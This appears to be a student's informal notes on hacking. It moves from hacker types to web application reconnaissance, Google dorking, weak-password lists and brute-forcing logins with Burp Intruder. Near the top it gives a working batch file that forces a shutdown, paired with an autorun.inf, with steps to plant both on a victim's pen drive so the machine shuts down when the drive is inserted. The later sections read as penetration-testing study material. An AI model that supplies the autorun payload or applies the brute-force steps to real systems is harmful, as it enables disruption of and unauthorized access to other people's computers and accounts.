About hacking
It is the art of exporting technologies and finding bugs for the same,
Types of hacker-
1-Black hat hacker-
These are cyber criminals their main objective is to spread cyber violance and raise money for different
criminal activities.
2-White hat hacker-
These are the good guyz having some knowledge as black hat hacker but they use the skill for the protection.
3-Grey hat hacker-
These are half devil and half angel kind of hackers.
e.g Zoo zoo hacker
4-Script Kiddes-
These are cyber kids having no knowledge about hacking,but they do hacking for a reason or 
due to task assigned by some one.

tep 1:>>copy this  code into notepad: 
@echo off
shutdown -s -t 00
Save as besthacking.bat extension (for eg: besthacking.bat). 
Step 2: 
      Now open the notepad and copy this code: 
[autorun]
Open=besthacking.bat
Action=Mouse Disable

   Save it as "autorun.inf" 
Then copy the two files in your pen drive or victim's pen drive. 
That's all whenever the victim insert his pen drive,the system will be turned off automatically.

unit3-Mapping the applications
effective mapping is a valuable skill.
If the application provides a site map it is very beneficial.
web spidering
there are some tools that are used to enumerate application contet and functionality like burpsuite,webscarab,zed attack proxy and CAT.
many web servers contain a file named robots.txt in the web root that contain a list of URLs that the site does not want webspiders to visit or search engines to index.
1-map the application using burp suite
IEwatch tool which runs with Microsoft IE monitors all the details of request and responses,including headers,request parameters and cookies.
302 Found-The resource may be accessible only by authenticated users.
400 Bad request-the application may use custom naming scheme and files within URLs,which a particular request in not complied with.
401 Unauthorized or 403 Forbidden-this usually indicates that the requested resource exist but may not be accessed by any user regardless of authentication status or privilege level.
500 Internal Server Error- During content discovery, this usually indicates that the application expects certain parameters to be submitted when requesting the resource. 
The DirBuster project from OWASP is also a useful resource when performing automated content discovery tasks. It includes large lists of directory names that have been found in the wild, ordered by frequency of occurrence.
Use of Public Information in mapping application.
site:www.wahh-target.com returns every resource within the target site that Google has a reference to. 
site:www.wahh-target.com login returns all the pages containing the expression login

-The core security mechanisms and how they function — in particular, management of session state, access controls, and authentication mechanisms and supporting logic (user registration, password change, and account recovery)
-All the different locations at which the application processes user-supplied input — every URL, query string parameter, item of POST data, and cookie 
-The technologies employed on the client side, including forms, clientside scripts, thick-client components (Java applets, ActiveX controls, and Flash), and cookies 
-The technologies employed on the server side, including static and dynamic pages, the types of request parameters employed, the use of SSL, web server software, interaction with databases, e-mail systems, and other back-end components 
Identifying Entry Points for User Input 
-Every URL string up to the query string marker
-Every parameter submitted within the URL query string
-Every parameter submitted within the body of a POST request 
-Every cookie 
-Every other HTTP header that the application might process — in particular, the User-Agent,Referer,Accept,Accept-Language, and Host headers
URL File Paths 
The parts of the URL that precede the query string are often overlooked as entry points, 
A typical REST-style URL could have this format:
http://eis/shop/browse/electronics/iPhone3G/
HTTP Headers 
Many applications perform custom logging functions and may log the contents of HTTP headers such as Referer and User-Agent. 
Identifying Server-Side Technologies 
1-Banner Grabbing -get version of server
2-HTTP Fingerprinting 
Httprecon is a handy tool that performs a number of tests in an attempt to ?ngerprint a web server’s software.

Attacking Authentication--

**Authentication Technologies-
 HTML forms-based authentication(90% used)
 Multifactor mechanisms, such as those combining passwords and physical tokens(In the most security-critical applications, such as private banking for high-worth individuals)(otp)
 Client SSL certificates or cryptographic mechanisms implemented within smartcards(e.g, web-based VPNs for remote office workers)
 HTTP based authentication(encountered in intranet environments where an organization’s internal users gain access to corporate applications by supplying their normal network or domain credentials) 
 Windows-integrated authentication using NTLM or Kerberos 
 Authentication services 

Note:Third-party authentication services such as Microsoft Passport are occasionally encountered.

**Design Flaws in Authentication Mechanisms
 1-Bad Passwords 
 --Very short or blank 
 --Common dictionary words or names 
 --The same as the username 
 --Still set to a default value

HACK STEPS
 Review the website for any description of the rules.
 If self-registration is possible, attempt to register several accounts with different kinds of weak passwords to discover what rules are in place. 
 If you control a single account and password change is possible, attempt to change your password to various weak values.
 
 2-Brute-Forcible Login 
 The most popular real-world passwords:
 n password
 n website name
 n 12345678
 n qwerty
 n abc123
 n 111111
 n monkey
 n 12345
 n letmein
//in chapter 14 they use various tools to find password
By using Burp Intruder 
The successful login attempt can be clearly distinguished by the difference in the HTTP response code, the response length, and the absence of the “login incorrect” message.
